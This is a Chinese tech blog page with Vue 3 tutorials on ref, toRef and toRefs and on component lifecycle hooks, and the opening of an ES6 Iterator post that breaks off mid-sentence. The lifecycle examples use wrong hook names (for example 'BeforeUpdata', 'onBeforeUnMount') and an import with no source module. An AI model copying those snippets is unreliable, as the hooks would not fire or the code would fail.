    <footer class="article-footer">
      <a data-url="http://example.com/2021/05/17/Vue007/" data-id="clur520qy0025moccdkw30c8w" data-title="【Vue3.x】Vue3响应式原理" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Vue006" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/04/10/Vue006/" class="article-date">
  <time class="dt-published" datetime="2021-04-10T05:51:13.000Z" itemprop="datePublished">2021-04-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/04/10/Vue006/">【Vue3.x】ref、toRef、toRefs</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h1><p>ref 用于生成值类型的响应式数据，可用于模板和 reactive。在 reactive 和模板中不需要使用 <code>.value</code> 来读取和修改值，其他 JS 代码中都需要使用 <code>.value</code> 来读取和修改值。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Ref demo &#123;&#123;ageRef&#125;&#125; &#123;&#123;state.name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, reactive &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Ref&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 建议 ref 变量名都为 xxxRef。 </span></span><br><span class="line">    <span class="keyword">const</span> ageRef = <span class="title function_">ref</span>(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">const</span> nameRef = <span class="title function_">ref</span>(<span class="string">&#x27;lily&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: nameRef</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ageRef&#x27;</span>, ageRef.<span class="property">value</span>)</span><br><span class="line">      </span><br><span class="line">      nameRef.<span class="property">value</span> = <span class="string">&#x27;cici&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      ageRef,</span><br><span class="line">      state</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="为什么要用-value"><a href="#为什么要用-value" class="headerlink" title="为什么要用 .value ?"></a>为什么要用 .value ?</h4><p> ref 函数接受参数并将其包装在具有 value 属性的对象中，然后将其用于访问或更改反应变量的值：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(counter) <span class="comment">// &#123; value: 0 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(counter.<span class="property">value</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">counter.<span class="property">value</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(counter.<span class="property">value</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p><strong>因为值类型会丢失响应式，因此需要引用类型。</strong>因此把 ref 函数返回对象，把真正要存的值放在这个对象的 value 属性里，通过 value 属性的 get 和 set 实现响应式。因此读取值的时候也需要加上 <code>.value</code>，而用于模板、reactive 时，不需要使用 <code>.value</code>。（因为模板和 reactive 都是经过 Vue 编译的，Vue 内部会给它解决，而其他情况得自己解决。）</p>
<h4 id="补充：ref-还可以用于获取-dom-节点"><a href="#补充：ref-还可以用于获取-dom-节点" class="headerlink" title="补充：ref 还可以用于获取 dom 节点"></a>补充：ref 还可以用于获取 dom 节点</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">ref</span>=<span class="string">&quot;elemRef&quot;</span>&gt;</span>我是一行文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, onMounted &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;RefTemplate&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> elemRef = <span class="title function_">ref</span>(<span class="literal">null</span>)</span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(elemRef.<span class="property">value</span>) <span class="comment">// &lt;p&gt;我是一行文字&lt;/p&gt;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="toRef"><a href="#toRef" class="headerlink" title="toRef"></a>toRef</h1><p>toRef 针对一个响应式对象（reactive 封装）的 prop，创建一个 ref，然后可以将 ref 传递出去，从而保持对其源属性的响应性连接。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fooRef = <span class="title function_">toRef</span>(state, <span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fooRef.<span class="property">value</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(state.<span class="property">foo</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">state.<span class="property">foo</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fooRef.<span class="property">value</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>toRef 如果用于普通对象（就是非 reactive 封装的 非响应式对象），则产出的结果可以显示出来，但是不具备响应式。</p>
<h1 id="toRefs"><a href="#toRefs" class="headerlink" title="toRefs"></a>toRefs</h1><p>将响应式对象（reactive 封装）转换成普通对象，其中所得对象的每个属性都 ref 指向原始对象的相应属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stateAsRefs = <span class="title function_">toRefs</span>(state)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Type of stateAsRefs:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  foo: Ref&lt;number&gt;,</span></span><br><span class="line"><span class="comment">  bar: Ref&lt;number&gt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The ref and the original property is &quot;linked&quot;</span></span><br><span class="line">state.<span class="property">foo</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stateAsRefs.<span class="property">foo</span>.<span class="property">value</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">stateAsRefs.<span class="property">foo</span>.<span class="property">value</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(state.<span class="property">foo</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>



<h4 id="为什么需要-toRefs-？"><a href="#为什么需要-toRefs-？" class="headerlink" title="为什么需要 toRefs ？"></a>为什么需要 toRefs ？</h4><p>我们先看一个示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;state.age&#125;&#125; - &#123;&#123;state.name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      state</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，我们使用 state 属性的时候，前面都需要加上 <code>state.</code> ，这样很麻烦。</p>
<p>我们在看一个使用了 toRefs 的示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;age&#125;&#125; - &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;lily&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> stateAsRefs = <span class="title function_">toRefs</span>(state)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> stateAsRefs</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变成普通对象后可以直接返回，在模板中使用时不用再使用 <code>state.XXX</code> 的形式了，便捷了很多。</p>
<p>但是为什么不能直接像下面这样将 state 解构返回，再在模板中使用  和  呢？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  ...state</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这样会将 age 和 name 的响应性破坏掉！这样解构出来的属性是没有响应性的。</p>
<p>因此 toRefs 用于合成函数返回响应式对象非常有用，它可以使组件可以对返回的对象进行解构&#x2F;扩展而不会失去响应性：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">useFeatureX</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="number">2</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 逻辑运行状态，省略 N </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回时转换成 refs</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">toRefs</span>(state)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 可以在不失去响应性的情况下结构</span></span><br><span class="line">    <span class="keyword">const</span> &#123; foo, bar &#125; = <span class="title function_">useFeatureX</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      foo,</span><br><span class="line">      bar</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>toRef 和 toRefs 的初衷就是在不丢失响应式的情况下，把对象数据解构，针对的是 reactive 封装的响应式对象而非普通对象。</p>
<p>注意：<strong>toRef 和 toRefs 不是创造响应式，而是延续响应式（创造响应式是 ref 和 reactive 的事情）</strong></p>
<img src="1.jpeg">


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/04/10/Vue006/" data-id="clur520qz0029mocc0behdzfo" data-title="【Vue3.x】ref、toRef、toRefs" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Vue005" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/04/09/Vue005/" class="article-date">
  <time class="dt-published" datetime="2021-04-09T02:52:43.000Z" itemprop="datePublished">2021-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/04/09/Vue005/">【Vue3.x】Vue3生命周期</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Vue3 支持 Options API 和 Composition API 。</p>
<h2 id="一、Options-API-的生命周期（基本与-Vue2-生命周期一致）"><a href="#一、Options-API-的生命周期（基本与-Vue2-生命周期一致）" class="headerlink" title="一、Options API 的生命周期（基本与 Vue2 生命周期一致）"></a>一、Options API 的生命周期（基本与 Vue2 生命周期一致）</h2><p>类似于 Vue2 中的生命周期，只做了一点更改。</p>
<p><code>beforeDestroy</code> 改为 <code>beforeUnmount</code>，<code>destroyed</code> 改为 <code>unmounted</code>，其他沿用 Vue2 的生命周期。</p>
<p>Options API 就是在一个 vue 文件中的 methods、computed、watch、data 中等等定义属性和方法，共同处理页面逻辑。</p>
<img src="1.png" width="40%">

<p>用法如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeCreate&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;created&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">BeforeMount</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;BeforeMount&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">Mounted</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Mounted&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">BeforeUpdata</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;BeforeUpdata&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">Updated</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Updated&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">BeforeUnMount</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;BeforeUnMount&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">UnMounted</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;UnMounted&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>缺点：</strong> 一个功能往往需要在不同的 vue 配置项中定义属性和方法，比较分散，项目小还好，清晰明了；但是项目大了后，一个 methods 中可能包含非常多个方法，往往难以分清哪个方法对应着哪个功能。</p>
<p>vue3 中的 Composition API 就是用来解决上述缺点的。</p>
<h2 id="二、Composition-API-的生命周期（Vue3-新提出）"><a href="#二、Composition-API-的生命周期（Vue3-新提出）" class="headerlink" title="二、Composition API 的生命周期（Vue3 新提出）"></a>二、Composition API 的生命周期（Vue3 新提出）</h2><p>在 Vue3 Composition API 中，我们的代码是根据逻辑功能来组织的，一个功能所定义的所有 API 会放在一起（更加的高内聚，低耦合）。这样做，即时项目很大，功能很多，我们都能快速的定位到这个功能所用到的所有 API，而不像 Vue2 Options API，一个功能所用到的 API 都是分散的，需要改动功能，到处找API的过程是很费劲的。</p>
<p><img src="2.png" width="35%"><img src="3.png" width="75%"></p>
<p>用法如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; onBeforeMount, onMounted, onBeforeUpdata, onUpdated, onBeforeUnMount, onUnMounted &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在生命周期的角度上等价于 beforeCreate 和 created</span></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;setup&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onBeforeMount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onBeforeMount&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onMounted&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">onBeforeUpdata</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onBeforeUpdata&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">onUpdated</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onUpdated&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">onBeforeUnMount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onBeforeUnMount&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">onUnMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onUnMounted&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Composition-API-带来了什么？"><a href="#Composition-API-带来了什么？" class="headerlink" title="Composition API 带来了什么？"></a>Composition API 带来了什么？</h4><ul>
<li><p>更好的代码组织，根据逻辑相关性组织代码，提高可读性和可维护性</p>
</li>
<li><p>更好的逻辑复用，是基于函数组合的 API （在 Vue2 Options API 中通过 Mixins 重用逻辑代码，容易发生命名冲突且关系不清）</p>
</li>
<li><p>更好的类型推导</p>
</li>
</ul>
<p>注意，Composition API 带来的好处并不是刚需，是给比较大比较复杂的项目使用的。</p>
<h2 id="三、如何选择？"><a href="#三、如何选择？" class="headerlink" title="三、如何选择？"></a>三、如何选择？</h2><ul>
<li>不建议 Options API 与 Composition API 共用，会引起混乱</li>
<li>小型项目、业务逻辑简单，用 Options API</li>
<li>中大型项目、逻辑复杂，用 Composition API（Composition API 就是为了解决复杂场景的业务逻辑而设计的）</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/04/09/Vue005/" data-id="clur520qy0023mocccgxk73pu" data-title="【Vue3.x】Vue3生命周期" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ES021" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/24/ES021/" class="article-date">
  <time class="dt-published" datetime="2021-03-24T07:36:13.000Z" itemprop="datePublished">2021-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/24/ES021/">（二十一）ES6：Iterator</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JS 中有 4 种表示“集合”的数据结构：Array、Set、Object、Map。我们也可以组合使用它们来定义自己的数据结构。这样就需要一种统一的接口机制，来处理所有不同的数据结构。</p>
<p>Iterator（遍历器&#x2F;迭代器）就是这样的一种机制，它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。</p>
<p>我们看一个遍历器生成函数示例，初步了解一下遍历器：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeIterator</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> nextIndex = <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> nextIndex &lt; arr.<span class="property">length</span> ?</span><br><span class="line">      &#123; <span class="attr">value</span>: arr[nextIndex++], <span class="attr">done</span>: <span class="literal">false</span> &#125; :</span><br><span class="line">      &#123; <span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> it = <span class="title function_">makeIterator</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()) <span class="comment">// &#123;value: &quot;a&quot;, done: false&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()) <span class="comment">// &#123;value: &quot;b&quot;, done: false&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()) <span class="comment">// &#123;value: &quot;c&quot;, done: false&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()) <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="我们先来了解一下可遍历和不可遍历的数据结构"><a href="#我们先来了解一下可遍历和不可遍历的数据结构" class="headerlink" title="我们先来了解一下可遍历和不可遍历的数据结构"></a>我们先来了解一下可遍历和不可遍历的数据结构</h3><p>数组是可遍历的，为什么呢？因为它拥有 <code>[Symbol.iterator]()</code> 方法（ Iterator 接口），我们输出一个数组，然后可以在它的原型中找到这个方法，</p>
